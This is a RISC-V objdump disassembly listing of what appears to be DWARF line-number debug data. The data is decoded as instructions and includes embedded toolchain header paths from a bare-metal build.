     4d6:	0901                	addi	s2,s2,0
     4d8:	0002                	c.slli	zero,0x0
     4da:	0301                	addi	t1,t1,0
     4dc:	0901                	addi	s2,s2,0
     4de:	0002                	c.slli	zero,0x0
     4e0:	0301                	addi	t1,t1,0
     4e2:	0901                	addi	s2,s2,0
     4e4:	0002                	c.slli	zero,0x0
     4e6:	0301                	addi	t1,t1,0
     4e8:	0901                	addi	s2,s2,0
     4ea:	0002                	c.slli	zero,0x0
     4ec:	0301                	addi	t1,t1,0
     4ee:	0901                	addi	s2,s2,0
     4f0:	0002                	c.slli	zero,0x0
     4f2:	0301                	addi	t1,t1,0
     4f4:	0901                	addi	s2,s2,0
     4f6:	0002                	c.slli	zero,0x0
     4f8:	0301                	addi	t1,t1,0
     4fa:	0901                	addi	s2,s2,0
     4fc:	0002                	c.slli	zero,0x0
     4fe:	0301                	addi	t1,t1,0
     500:	0901                	addi	s2,s2,0
     502:	0002                	c.slli	zero,0x0
     504:	0301                	addi	t1,t1,0
     506:	0901                	addi	s2,s2,0
     508:	0002                	c.slli	zero,0x0
     50a:	0301                	addi	t1,t1,0
     50c:	0901                	addi	s2,s2,0
     50e:	0002                	c.slli	zero,0x0
     510:	0301                	addi	t1,t1,0
     512:	0901                	addi	s2,s2,0
     514:	0002                	c.slli	zero,0x0
     516:	0301                	addi	t1,t1,0
     518:	0901                	addi	s2,s2,0
     51a:	0002                	c.slli	zero,0x0
     51c:	0301                	addi	t1,t1,0
     51e:	0901                	addi	s2,s2,0
     520:	0002                	c.slli	zero,0x0
     522:	0301                	addi	t1,t1,0
     524:	00020903          	lb	s2,0(tp) # ffffffffffff9000 <_end+0xffffffff7ffddb40>
     528:	0301                	addi	t1,t1,0
     52a:	0901                	addi	s2,s2,0
     52c:	0002                	c.slli	zero,0x0
     52e:	0301                	addi	t1,t1,0
     530:	00040903          	lb	s2,0(s0)
     534:	0301                	addi	t1,t1,0
     536:	0902                	slli	s2,s2,0x0
     538:	0002                	c.slli	zero,0x0
     53a:	0301                	addi	t1,t1,0
     53c:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     540:	0301                	addi	t1,t1,0
     542:	0906                	slli	s2,s2,0x1
     544:	0004                	0x4
     546:	0301                	addi	t1,t1,0
     548:	0901                	addi	s2,s2,0
     54a:	0002                	c.slli	zero,0x0
     54c:	0301                	addi	t1,t1,0
     54e:	0901                	addi	s2,s2,0
     550:	0008                	0x8
     552:	0301                	addi	t1,t1,0
     554:	0904                	addi	s1,sp,144
     556:	0002                	c.slli	zero,0x0
     558:	0301                	addi	t1,t1,0
     55a:	00080903          	lb	s2,0(a6)
     55e:	0301                	addi	t1,t1,0
     560:	00040903          	lb	s2,0(s0)
     564:	0301                	addi	t1,t1,0
     566:	0902                	slli	s2,s2,0x0
     568:	0004                	0x4
     56a:	0301                	addi	t1,t1,0
     56c:	0901                	addi	s2,s2,0
     56e:	0004                	0x4
     570:	0301                	addi	t1,t1,0
     572:	0901                	addi	s2,s2,0
     574:	0004                	0x4
     576:	0301                	addi	t1,t1,0
     578:	0901                	addi	s2,s2,0
     57a:	0004                	0x4
     57c:	0301                	addi	t1,t1,0
     57e:	0901                	addi	s2,s2,0
     580:	0004                	0x4
     582:	0301                	addi	t1,t1,0
     584:	0901                	addi	s2,s2,0
     586:	0004                	0x4
     588:	0301                	addi	t1,t1,0
     58a:	0901                	addi	s2,s2,0
     58c:	0004                	0x4
     58e:	0301                	addi	t1,t1,0
     590:	0901                	addi	s2,s2,0
     592:	0004                	0x4
     594:	0301                	addi	t1,t1,0
     596:	0901                	addi	s2,s2,0
     598:	0004                	0x4
     59a:	0301                	addi	t1,t1,0
     59c:	0901                	addi	s2,s2,0
     59e:	0004                	0x4
     5a0:	0301                	addi	t1,t1,0
     5a2:	0901                	addi	s2,s2,0
     5a4:	0004                	0x4
     5a6:	0301                	addi	t1,t1,0
     5a8:	0901                	addi	s2,s2,0
     5aa:	0004                	0x4
     5ac:	0301                	addi	t1,t1,0
     5ae:	0901                	addi	s2,s2,0
     5b0:	0004                	0x4
     5b2:	0301                	addi	t1,t1,0
     5b4:	0901                	addi	s2,s2,0
     5b6:	0004                	0x4
     5b8:	0301                	addi	t1,t1,0
     5ba:	0901                	addi	s2,s2,0
     5bc:	0004                	0x4
     5be:	0301                	addi	t1,t1,0
     5c0:	0901                	addi	s2,s2,0
     5c2:	0004                	0x4
     5c4:	0301                	addi	t1,t1,0
     5c6:	0901                	addi	s2,s2,0
     5c8:	0004                	0x4
     5ca:	0301                	addi	t1,t1,0
     5cc:	0901                	addi	s2,s2,0
     5ce:	0004                	0x4
     5d0:	0301                	addi	t1,t1,0
     5d2:	0901                	addi	s2,s2,0
     5d4:	0004                	0x4
     5d6:	0301                	addi	t1,t1,0
     5d8:	0901                	addi	s2,s2,0
     5da:	0004                	0x4
     5dc:	0301                	addi	t1,t1,0
     5de:	0901                	addi	s2,s2,0
     5e0:	0004                	0x4
     5e2:	0301                	addi	t1,t1,0
     5e4:	0901                	addi	s2,s2,0
     5e6:	0004                	0x4
     5e8:	0301                	addi	t1,t1,0
     5ea:	0901                	addi	s2,s2,0
     5ec:	0004                	0x4
     5ee:	0301                	addi	t1,t1,0
     5f0:	0901                	addi	s2,s2,0
     5f2:	0004                	0x4
     5f4:	0301                	addi	t1,t1,0
     5f6:	0901                	addi	s2,s2,0
     5f8:	0004                	0x4
     5fa:	0301                	addi	t1,t1,0
     5fc:	0901                	addi	s2,s2,0
     5fe:	0004                	0x4
     600:	0301                	addi	t1,t1,0
     602:	0901                	addi	s2,s2,0
     604:	0004                	0x4
     606:	0301                	addi	t1,t1,0
     608:	0901                	addi	s2,s2,0
     60a:	0004                	0x4
     60c:	0301                	addi	t1,t1,0
     60e:	0901                	addi	s2,s2,0
     610:	0004                	0x4
     612:	0301                	addi	t1,t1,0
     614:	0901                	addi	s2,s2,0
     616:	0004                	0x4
     618:	0301                	addi	t1,t1,0
     61a:	0901                	addi	s2,s2,0
     61c:	0004                	0x4
     61e:	0301                	addi	t1,t1,0
     620:	0901                	addi	s2,s2,0
     622:	0004                	0x4
     624:	0301                	addi	t1,t1,0
     626:	0905                	addi	s2,s2,1
     628:	0004                	0x4
     62a:	0301                	addi	t1,t1,0
     62c:	0901                	addi	s2,s2,0
     62e:	0008                	0x8
     630:	0301                	addi	t1,t1,0
     632:	0905                	addi	s2,s2,1
     634:	0004                	0x4
     636:	0301                	addi	t1,t1,0
     638:	0904                	addi	s1,sp,144
     63a:	0008                	0x8
     63c:	0301                	addi	t1,t1,0
     63e:	0901                	addi	s2,s2,0
     640:	0008                	0x8
     642:	0301                	addi	t1,t1,0
     644:	00040903          	lb	s2,0(s0)
     648:	0301                	addi	t1,t1,0
     64a:	0902                	slli	s2,s2,0x0
     64c:	0004                	0x4
     64e:	0301                	addi	t1,t1,0
     650:	0902                	slli	s2,s2,0x0
     652:	0002                	c.slli	zero,0x0
     654:	0301                	addi	t1,t1,0
     656:	0904                	addi	s1,sp,144
     658:	0004                	0x4
     65a:	0301                	addi	t1,t1,0
     65c:	0901                	addi	s2,s2,0
     65e:	0004                	0x4
     660:	0301                	addi	t1,t1,0
     662:	0901                	addi	s2,s2,0
     664:	0002                	c.slli	zero,0x0
     666:	0301                	addi	t1,t1,0
     668:	0901                	addi	s2,s2,0
     66a:	0004                	0x4
     66c:	0301                	addi	t1,t1,0
     66e:	0901                	addi	s2,s2,0
     670:	0002                	c.slli	zero,0x0
     672:	0301                	addi	t1,t1,0
     674:	0902                	slli	s2,s2,0x0
     676:	0002                	c.slli	zero,0x0
     678:	0301                	addi	t1,t1,0
     67a:	0904                	addi	s1,sp,144
     67c:	0004                	0x4
     67e:	0301                	addi	t1,t1,0
     680:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     684:	0301                	addi	t1,t1,0
     686:	0901                	addi	s2,s2,0
     688:	0002                	c.slli	zero,0x0
     68a:	0301                	addi	t1,t1,0
     68c:	0901                	addi	s2,s2,0
     68e:	0002                	c.slli	zero,0x0
     690:	0301                	addi	t1,t1,0
     692:	0901                	addi	s2,s2,0
     694:	0002                	c.slli	zero,0x0
     696:	0301                	addi	t1,t1,0
     698:	0901                	addi	s2,s2,0
     69a:	0002                	c.slli	zero,0x0
     69c:	0301                	addi	t1,t1,0
     69e:	0901                	addi	s2,s2,0
     6a0:	0002                	c.slli	zero,0x0
     6a2:	0301                	addi	t1,t1,0
     6a4:	0901                	addi	s2,s2,0
     6a6:	0002                	c.slli	zero,0x0
     6a8:	0301                	addi	t1,t1,0
     6aa:	0901                	addi	s2,s2,0
     6ac:	0002                	c.slli	zero,0x0
     6ae:	0301                	addi	t1,t1,0
     6b0:	0901                	addi	s2,s2,0
     6b2:	0002                	c.slli	zero,0x0
     6b4:	0301                	addi	t1,t1,0
     6b6:	0901                	addi	s2,s2,0
     6b8:	0002                	c.slli	zero,0x0
     6ba:	0301                	addi	t1,t1,0
     6bc:	0901                	addi	s2,s2,0
     6be:	0002                	c.slli	zero,0x0
     6c0:	0301                	addi	t1,t1,0
     6c2:	0901                	addi	s2,s2,0
     6c4:	0002                	c.slli	zero,0x0
     6c6:	0301                	addi	t1,t1,0
     6c8:	0901                	addi	s2,s2,0
     6ca:	0002                	c.slli	zero,0x0
     6cc:	0301                	addi	t1,t1,0
     6ce:	0901                	addi	s2,s2,0
     6d0:	0002                	c.slli	zero,0x0
     6d2:	0301                	addi	t1,t1,0
     6d4:	0901                	addi	s2,s2,0
     6d6:	0002                	c.slli	zero,0x0
     6d8:	0301                	addi	t1,t1,0
     6da:	0901                	addi	s2,s2,0
     6dc:	0002                	c.slli	zero,0x0
     6de:	0301                	addi	t1,t1,0
     6e0:	0901                	addi	s2,s2,0
     6e2:	0002                	c.slli	zero,0x0
     6e4:	0301                	addi	t1,t1,0
     6e6:	0901                	addi	s2,s2,0
     6e8:	0002                	c.slli	zero,0x0
     6ea:	0301                	addi	t1,t1,0
     6ec:	0901                	addi	s2,s2,0
     6ee:	0002                	c.slli	zero,0x0
     6f0:	0301                	addi	t1,t1,0
     6f2:	0901                	addi	s2,s2,0
     6f4:	0002                	c.slli	zero,0x0
     6f6:	0301                	addi	t1,t1,0
     6f8:	0901                	addi	s2,s2,0
     6fa:	0002                	c.slli	zero,0x0
     6fc:	0301                	addi	t1,t1,0
     6fe:	0901                	addi	s2,s2,0
     700:	0002                	c.slli	zero,0x0
     702:	0301                	addi	t1,t1,0
     704:	0901                	addi	s2,s2,0
     706:	0002                	c.slli	zero,0x0
     708:	0301                	addi	t1,t1,0
     70a:	0901                	addi	s2,s2,0
     70c:	0002                	c.slli	zero,0x0
     70e:	0301                	addi	t1,t1,0
     710:	0901                	addi	s2,s2,0
     712:	0002                	c.slli	zero,0x0
     714:	0301                	addi	t1,t1,0
     716:	0901                	addi	s2,s2,0
     718:	0002                	c.slli	zero,0x0
     71a:	0301                	addi	t1,t1,0
     71c:	0901                	addi	s2,s2,0
     71e:	0002                	c.slli	zero,0x0
     720:	0301                	addi	t1,t1,0
     722:	0901                	addi	s2,s2,0
     724:	0002                	c.slli	zero,0x0
     726:	0301                	addi	t1,t1,0
     728:	0901                	addi	s2,s2,0
     72a:	0002                	c.slli	zero,0x0
     72c:	0301                	addi	t1,t1,0
     72e:	0901                	addi	s2,s2,0
     730:	0002                	c.slli	zero,0x0
     732:	0301                	addi	t1,t1,0
     734:	0901                	addi	s2,s2,0
     736:	0002                	c.slli	zero,0x0
     738:	0301                	addi	t1,t1,0
     73a:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     73e:	0301                	addi	t1,t1,0
     740:	00040903          	lb	s2,0(s0)
     744:	0301                	addi	t1,t1,0
     746:	00040903          	lb	s2,0(s0)
     74a:	0301                	addi	t1,t1,0
     74c:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     750:	0301                	addi	t1,t1,0
     752:	00040903          	lb	s2,0(s0)
     756:	0301                	addi	t1,t1,0
     758:	00040903          	lb	s2,0(s0)
     75c:	0301                	addi	t1,t1,0
     75e:	0901                	addi	s2,s2,0
     760:	0008                	0x8
     762:	0301                	addi	t1,t1,0
     764:	0902                	slli	s2,s2,0x0
     766:	0004                	0x4
     768:	0301                	addi	t1,t1,0
     76a:	0901                	addi	s2,s2,0
     76c:	0002                	c.slli	zero,0x0
     76e:	0301                	addi	t1,t1,0
     770:	0901                	addi	s2,s2,0
     772:	0002                	c.slli	zero,0x0
     774:	0301                	addi	t1,t1,0
     776:	0901                	addi	s2,s2,0
     778:	0002                	c.slli	zero,0x0
     77a:	0301                	addi	t1,t1,0
     77c:	0901                	addi	s2,s2,0
     77e:	0002                	c.slli	zero,0x0
     780:	0301                	addi	t1,t1,0
     782:	0901                	addi	s2,s2,0
     784:	0002                	c.slli	zero,0x0
     786:	0301                	addi	t1,t1,0
     788:	0901                	addi	s2,s2,0
     78a:	0002                	c.slli	zero,0x0
     78c:	0301                	addi	t1,t1,0
     78e:	0901                	addi	s2,s2,0
     790:	0002                	c.slli	zero,0x0
     792:	0301                	addi	t1,t1,0
     794:	0901                	addi	s2,s2,0
     796:	0002                	c.slli	zero,0x0
     798:	0301                	addi	t1,t1,0
     79a:	0901                	addi	s2,s2,0
     79c:	0002                	c.slli	zero,0x0
     79e:	0301                	addi	t1,t1,0
     7a0:	0901                	addi	s2,s2,0
     7a2:	0002                	c.slli	zero,0x0
     7a4:	0301                	addi	t1,t1,0
     7a6:	0901                	addi	s2,s2,0
     7a8:	0002                	c.slli	zero,0x0
     7aa:	0301                	addi	t1,t1,0
     7ac:	0901                	addi	s2,s2,0
     7ae:	0002                	c.slli	zero,0x0
     7b0:	0301                	addi	t1,t1,0
     7b2:	0901                	addi	s2,s2,0
     7b4:	0002                	c.slli	zero,0x0
     7b6:	0301                	addi	t1,t1,0
     7b8:	0901                	addi	s2,s2,0
     7ba:	0002                	c.slli	zero,0x0
     7bc:	0301                	addi	t1,t1,0
     7be:	0901                	addi	s2,s2,0
     7c0:	0002                	c.slli	zero,0x0
     7c2:	0301                	addi	t1,t1,0
     7c4:	0901                	addi	s2,s2,0
     7c6:	0002                	c.slli	zero,0x0
     7c8:	0301                	addi	t1,t1,0
     7ca:	0901                	addi	s2,s2,0
     7cc:	0002                	c.slli	zero,0x0
     7ce:	0301                	addi	t1,t1,0
     7d0:	0901                	addi	s2,s2,0
     7d2:	0002                	c.slli	zero,0x0
     7d4:	0301                	addi	t1,t1,0
     7d6:	0901                	addi	s2,s2,0
     7d8:	0002                	c.slli	zero,0x0
     7da:	0301                	addi	t1,t1,0
     7dc:	0901                	addi	s2,s2,0
     7de:	0002                	c.slli	zero,0x0
     7e0:	0301                	addi	t1,t1,0
     7e2:	0901                	addi	s2,s2,0
     7e4:	0002                	c.slli	zero,0x0
     7e6:	0301                	addi	t1,t1,0
     7e8:	0901                	addi	s2,s2,0
     7ea:	0002                	c.slli	zero,0x0
     7ec:	0301                	addi	t1,t1,0
     7ee:	0901                	addi	s2,s2,0
     7f0:	0002                	c.slli	zero,0x0
     7f2:	0301                	addi	t1,t1,0
     7f4:	0901                	addi	s2,s2,0
     7f6:	0002                	c.slli	zero,0x0
     7f8:	0301                	addi	t1,t1,0
     7fa:	0901                	addi	s2,s2,0
     7fc:	0002                	c.slli	zero,0x0
     7fe:	0301                	addi	t1,t1,0
     800:	0901                	addi	s2,s2,0
     802:	0002                	c.slli	zero,0x0
     804:	0301                	addi	t1,t1,0
     806:	0901                	addi	s2,s2,0
     808:	0002                	c.slli	zero,0x0
     80a:	0301                	addi	t1,t1,0
     80c:	0901                	addi	s2,s2,0
     80e:	0002                	c.slli	zero,0x0
     810:	0301                	addi	t1,t1,0
     812:	0901                	addi	s2,s2,0
     814:	0002                	c.slli	zero,0x0
     816:	0301                	addi	t1,t1,0
     818:	0901                	addi	s2,s2,0
     81a:	0002                	c.slli	zero,0x0
     81c:	0301                	addi	t1,t1,0
     81e:	0902                	slli	s2,s2,0x0
     820:	0002                	c.slli	zero,0x0
     822:	0301                	addi	t1,t1,0
     824:	0901                	addi	s2,s2,0
     826:	0002                	c.slli	zero,0x0
     828:	0901                	addi	s2,s2,0
     82a:	0004                	0x4
     82c:	0100                	addi	s0,sp,128
     82e:	8801                	andi	s0,s0,0
     830:	0000                	unimp
     832:	0200                	addi	s0,sp,256
     834:	2200                	fld	fs0,0(a2)
     836:	0000                	unimp
     838:	0100                	addi	s0,sp,128
     83a:	fb01                	bnez	a4,74a <_tbss_end+0x6c6>
     83c:	0d0e                	slli	s10,s10,0x3
     83e:	0100                	addi	s0,sp,128
     840:	0101                	addi	sp,sp,0
     842:	0001                	nop
     844:	0000                	unimp
     846:	0001                	nop
     848:	0100                	addi	s0,sp,128
     84a:	00637273          	csrrci	tp,0x6,6
     84e:	7300                	ld	s0,32(a4)
     850:	6174                	ld	a3,192(a0)
     852:	532e6b63          	bltu	t3,s2,d88 <_tbss_end+0xd04>
     856:	0100                	addi	s0,sp,128
     858:	0000                	unimp
     85a:	0000                	unimp
     85c:	0209                	addi	tp,tp,2
     85e:	15ea                	slli	a1,a1,0x3a
     860:	8000                	0x8000
     862:	0000                	unimp
     864:	0000                	unimp
     866:	09010317          	auipc	t1,0x9010
     86a:	0002                	c.slli	zero,0x0
     86c:	0301                	addi	t1,t1,0
     86e:	0904                	addi	s1,sp,144
     870:	0002                	c.slli	zero,0x0
     872:	0301                	addi	t1,t1,0
     874:	0901                	addi	s2,s2,0
     876:	0002                	c.slli	zero,0x0
     878:	0301                	addi	t1,t1,0
     87a:	0901                	addi	s2,s2,0
     87c:	0004                	0x4
     87e:	0301                	addi	t1,t1,0
     880:	0901                	addi	s2,s2,0
     882:	0004                	0x4
     884:	0301                	addi	t1,t1,0
     886:	0901                	addi	s2,s2,0
     888:	0004                	0x4
     88a:	0301                	addi	t1,t1,0
     88c:	0901                	addi	s2,s2,0
     88e:	0004                	0x4
     890:	0301                	addi	t1,t1,0
     892:	0901                	addi	s2,s2,0
     894:	0004                	0x4
     896:	0301                	addi	t1,t1,0
     898:	0901                	addi	s2,s2,0
     89a:	0004                	0x4
     89c:	0301                	addi	t1,t1,0
     89e:	0901                	addi	s2,s2,0
     8a0:	0004                	0x4
     8a2:	0301                	addi	t1,t1,0
     8a4:	0901                	addi	s2,s2,0
     8a6:	0004                	0x4
     8a8:	0301                	addi	t1,t1,0
     8aa:	0901                	addi	s2,s2,0
     8ac:	0004                	0x4
     8ae:	0301                	addi	t1,t1,0
     8b0:	00020903          	lb	s2,0(tp) # 0 <_tdata_begin>
     8b4:	0901                	addi	s2,s2,0
     8b6:	0002                	c.slli	zero,0x0
     8b8:	0100                	addi	s0,sp,128
     8ba:	7101                	addi	sp,sp,-512
     8bc:	0011                	c.nop	4
     8be:	0300                	addi	s0,sp,384
     8c0:	f600                	sd	s0,40(a2)
     8c2:	0001                	nop
     8c4:	0100                	addi	s0,sp,128
     8c6:	fb01                	bnez	a4,7d6 <_tbss_end+0x752>
     8c8:	0d0e                	slli	s10,s10,0x3
     8ca:	0100                	addi	s0,sp,128
     8cc:	0101                	addi	sp,sp,0
     8ce:	0001                	nop
     8d0:	0000                	unimp
     8d2:	0001                	nop
     8d4:	0100                	addi	s0,sp,128
     8d6:	6e69                	lui	t3,0x1a
     8d8:	72730063          	beq	t1,t2,ff8 <_tbss_end+0xf74>
     8dc:	682f0063          	beq	t5,sp,f5c <_tbss_end+0xed8>
     8e0:	2f656d6f          	jal	s10,56bd6 <_tbss_end+0x56b52>
     8e4:	6e656863          	bltu	a0,t1,fd4 <_tbss_end+0xf50>
     8e8:	61697867          	0x61697867
     8ec:	2f75796f          	jal	s2,583e2 <_tbss_end+0x5835e>
     8f0:	70696863          	bltu	s2,t1,1000 <_tbss_end+0xf7c>
     8f4:	6179                	addi	sp,sp,464
     8f6:	6472                	ld	s0,280(sp)
     8f8:	6f632e2f          	0x6f632e2f
     8fc:	646e                	ld	s0,216(sp)
     8fe:	2d61                	addiw	s10,s10,24
     900:	6e65                	lui	t3,0x19
     902:	2f76                	fld	ft10,344(sp)
     904:	6972                	ld	s2,280(sp)
     906:	2d766373          	csrrsi	t1,0x2d7,12
     90a:	6f74                	ld	a3,216(a4)
     90c:	2f736c6f          	jal	s8,37402 <_tbss_end+0x3737e>
     910:	6972                	ld	s2,280(sp)
     912:	36766373          	csrrsi	t1,0x367,12
     916:	2d34                	fld	fa3,88(a0)
     918:	6e75                	lui	t3,0x1d
     91a:	776f6e6b          	0x776f6e6b
     91e:	2d6e                	fld	fs10,216(sp)
     920:	6c65                	lui	s8,0x19
     922:	2f66                	fld	ft10,88(sp)
     924:	6e69                	lui	t3,0x1a
     926:	64756c63          	bltu	a0,t2,f7e <_tbss_end+0xefa>
     92a:	0065                	c.nop	25
     92c:	6d6f682f          	0x6d6f682f
     930:	2f65                	addiw	t5,t5,25
     932:	6e656863          	bltu	a0,t1,1022 <_tbss_end+0xf9e>
     936:	61697867          	0x61697867
     93a:	2f75796f          	jal	s2,58430 <_tbss_end+0x583ac>
     93e:	70696863          	bltu	s2,t1,104e <_tbss_end+0xfca>
     942:	6179                	addi	sp,sp,464
     944:	6472                	ld	s0,280(sp)
     946:	6f632e2f          	0x6f632e2f
     94a:	646e                	ld	s0,216(sp)
     94c:	2d61                	addiw	s10,s10,24
     94e:	6e65                	lui	t3,0x19
     950:	2f76                	fld	ft10,344(sp)
     952:	6972                	ld	s2,280(sp)
     954:	2d766373          	csrrsi	t1,0x2d7,12
     958:	6f74                	ld	a3,216(a4)
     95a:	2f736c6f          	jal	s8,37450 <_tbss_end+0x373cc>
     95e:	6972                	ld	s2,280(sp)
     960:	36766373          	csrrsi	t1,0x367,12
     964:	2d34                	fld	fa3,88(a0)
     966:	6e75                	lui	t3,0x1d
     968:	776f6e6b          	0x776f6e6b
     96c:	2d6e                	fld	fs10,216(sp)
     96e:	6c65                	lui	s8,0x19
     970:	2f66                	fld	ft10,88(sp)
     972:	6e69                	lui	t3,0x1a
     974:	64756c63          	bltu	a0,t2,fcc <_tbss_end+0xf48>
     978:	2f65                	addiw	t5,t5,25
     97a:	616d                	addi	sp,sp,240
     97c:	6e696863          	bltu	s2,t1,106c <_tbss_end+0xfe8>
     980:	0065                	c.nop	25
     982:	6d6f682f          	0x6d6f682f
     986:	2f65                	addiw	t5,t5,25
     988:	6e656863          	bltu	a0,t1,1078 <_tbss_end+0xff4>
     98c:	61697867          	0x61697867
     990:	2f75796f          	jal	s2,58486 <_tbss_end+0x58402>
     994:	70696863          	bltu	s2,t1,10a4 <_tbss_end+0x1020>
     998:	6179                	addi	sp,sp,464
     99a:	6472                	ld	s0,280(sp)
     99c:	6f632e2f          	0x6f632e2f
     9a0:	646e                	ld	s0,216(sp)
     9a2:	2d61                	addiw	s10,s10,24
     9a4:	6e65                	lui	t3,0x19
     9a6:	2f76                	fld	ft10,344(sp)
     9a8:	6972                	ld	s2,280(sp)
     9aa:	2d766373          	csrrsi	t1,0x2d7,12
     9ae:	6f74                	ld	a3,216(a4)
     9b0:	2f736c6f          	jal	s8,374a6 <_tbss_end+0x37422>
     9b4:	6972                	ld	s2,280(sp)
     9b6:	36766373          	csrrsi	t1,0x367,12
     9ba:	2d34                	fld	fa3,88(a0)
     9bc:	6e75                	lui	t3,0x1d
     9be:	776f6e6b          	0x776f6e6b
     9c2:	2d6e                	fld	fs10,216(sp)
     9c4:	6c65                	lui	s8,0x19
     9c6:	2f66                	fld	ft10,88(sp)
     9c8:	6e69                	lui	t3,0x1a
     9ca:	64756c63          	bltu	a0,t2,1022 <_tbss_end+0xf9e>
     9ce:	2f65                	addiw	t5,t5,25
     9d0:	00737973          	csrrci	s2,0x7,6
     9d4:	6d6f682f          	0x6d6f682f
     9d8:	2f65                	addiw	t5,t5,25
     9da:	6e656863          	bltu	a0,t1,10ca <_tbss_end+0x1046>
     9de:	61697867          	0x61697867
     9e2:	2f75796f          	jal	s2,584d8 <_tbss_end+0x58454>
     9e6:	70696863          	bltu	s2,t1,10f6 <_tbss_end+0x1072>
     9ea:	6179                	addi	sp,sp,464
     9ec:	6472                	ld	s0,280(sp)
     9ee:	6f632e2f          	0x6f632e2f
     9f2:	646e                	ld	s0,216(sp)
     9f4:	2d61                	addiw	s10,s10,24
     9f6:	6e65                	lui	t3,0x19
     9f8:	2f76                	fld	ft10,344(sp)
     9fa:	6972                	ld	s2,280(sp)
     9fc:	2d766373          	csrrsi	t1,0x2d7,12
     a00:	6f74                	ld	a3,216(a4)
     a02:	2f736c6f          	jal	s8,374f8 <_tbss_end+0x37474>
     a06:	696c                	ld	a1,208(a0)
     a08:	2f62                	fld	ft10,24(sp)
     a0a:	2f636367          	0x2f636367
     a0e:	6972                	ld	s2,280(sp)
     a10:	36766373          	csrrsi	t1,0x367,12
     a14:	2d34                	fld	fa3,88(a0)
     a16:	6e75                	lui	t3,0x1d
     a18:	776f6e6b          	0x776f6e6b
     a1c:	2d6e                	fld	fs10,216(sp)
     a1e:	6c65                	lui	s8,0x19
     a20:	2f66                	fld	ft10,88(sp)
     a22:	2e39                	addiw	t3,t3,14
     a24:	2e32                	fld	ft8,264(sp)
     a26:	2f30                	fld	fa2,88(a4)
     a28:	6e69                	lui	t3,0x1a
     a2a:	64756c63          	bltu	a0,t2,1082 <_tbss_end+0xffe>
     a2e:	0065                	c.nop	25
     a30:	7500                	ld	s0,40(a0)
     a32:	6974                	ld	a3,208(a0)
     a34:	2e6c                	fld	fa1,216(a2)
     a36:	0068                	addi	a0,sp,12
     a38:	0001                	nop
     a3a:	7300                	ld	s0,32(a4)
     a3c:	7379                	lui	t1,0xffffe
     a3e:	6c6c6163          	bltu	s8,t1,1100 <_tbss_end+0x107c>
     a42:	00632e73          	csrrs	t3,0x6,t1
     a46:	0002                	c.slli	zero,0x0
     a48:	7300                	ld	s0,32(a4)
     a4a:	6474                	ld	a3,200(s0)
     a4c:	6f69                	lui	t5,0x1a
     a4e:	682e                	ld	a6,200(sp)
     a50:	0300                	addi	s0,sp,384
     a52:	0000                	unimp
     a54:	645f 6665 7561      	0x75616665645f
     a5a:	746c                	ld	a1,232(s0)
     a5c:	745f 7079 7365      	0x73657079745f
     a62:	682e                	ld	a6,200(sp)
     a64:	0400                	addi	s0,sp,512
     a66:	0000                	unimp
     a68:	735f 6474 6e69      	0x6e696474735f
     a6e:	2e74                	fld	fa3,216(a2)
     a70:	0068                	addi	a0,sp,12
     a72:	0005                	c.nop	1
     a74:	7300                	ld	s0,32(a4)
     a76:	6474                	ld	a3,200(s0)
     a78:	6564                	ld	s1,200(a0)
     a7a:	2e66                	fld	ft8,88(sp)
     a7c:	0068                	addi	a0,sp,12
     a7e:	0006                	c.slli	zero,0x1
     a80:	5f00                	lw	s0,56(a4)
     a82:	7974                	ld	a3,240(a0)
     a84:	6570                	ld	a2,200(a0)
     a86:	00682e73          	csrrs	t3,0x6,a6
     a8a:	0005                	c.nop	1
     a8c:	7200                	ld	s0,32(a2)
     a8e:	6565                	lui	a0,0x19
     a90:	746e                	ld	s0,248(sp)
     a92:	682e                	ld	a6,200(sp)
     a94:	0500                	addi	s0,sp,640
     a96:	0000                	unimp
     a98:	6f6c                	ld	a1,216(a4)
     a9a:	682e6b63          	bltu	t3,sp,1130 <_tbss_end+0x10ac>
     a9e:	0500                	addi	s0,sp,640
     aa0:	0000                	unimp
     aa2:	61647473          	csrrci	s0,0x616,8
     aa6:	6772                	ld	a4,280(sp)
     aa8:	682e                	ld	a6,200(sp)
     aaa:	0600                	addi	s0,sp,768
     aac:	0000                	unimp
     aae:	69727473          	csrrci	s0,0x697,4
     ab2:	676e                	ld	a4,216(sp)
     ab4:	682e                	ld	a6,200(sp)
     ab6:	0300                	addi	s0,sp,384
     ab8:	0000                	unimp
     aba:	0500                	addi	s0,sp,640
     abc:	0001                	nop
     abe:	0209                	addi	tp,tp,2
     ac0:	1618                	addi	a4,sp,800
     ac2:	8000                	0x8000
     ac4:	0000                	unimp
     ac6:	0000                	unimp
     ac8:	03012803          	lw	a6,48(sp)
     acc:	0908                	addi	a0,sp,144
     ace:	0014                	0x14
     ad0:	0301                	addi	t1,t1,0
     ad2:	00080903          	lb	s2,0(a6)
     ad6:	0301                	addi	t1,t1,0
     ad8:	0908                	addi	a0,sp,144
     ada:	0014                	0x14
     adc:	0301                	addi	t1,t1,0
     ade:	00080903          	lb	s2,0(a6)
     ae2:	0501                	addi	a0,a0,0
     ae4:	030a                	slli	t1,t1,0x2
     ae6:	00140903          	lb	s2,1(s0)
     aea:	0501                	addi	a0,a0,0
     aec:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     af0:	0004                	0x4
     af2:	0501                	addi	a0,a0,0
     af4:	0312                	slli	t1,t1,0x4
     af6:	0902                	slli	s2,s2,0x0
     af8:	0002                	c.slli	zero,0x0
     afa:	0501                	addi	a0,a0,0
     afc:	0309                	addi	t1,t1,2
     afe:	0900                	addi	s0,sp,144
     b00:	000c                	0xc
     b02:	0501                	addi	a0,a0,0
     b04:	0320                	addi	s0,sp,392
     b06:	0900                	addi	s0,sp,144
     b08:	0006                	c.slli	zero,0x1
     b0a:	0501                	addi	a0,a0,0
     b0c:	09000317          	auipc	t1,0x9000
     b10:	000e                	c.slli	zero,0x3
     b12:	0501                	addi	a0,a0,0
     b14:	0314                	addi	a3,sp,384
     b16:	0901                	addi	s2,s2,0
     b18:	0006                	c.slli	zero,0x1
     b1a:	0501                	addi	a0,a0,0
     b1c:	0309                	addi	t1,t1,2
     b1e:	0900                	addi	s0,sp,144
     b20:	000c                	0xc
     b22:	0501                	addi	a0,a0,0
     b24:	0324                	addi	s1,sp,392
     b26:	0900                	addi	s0,sp,144
     b28:	0006                	c.slli	zero,0x1
     b2a:	0501                	addi	a0,a0,0
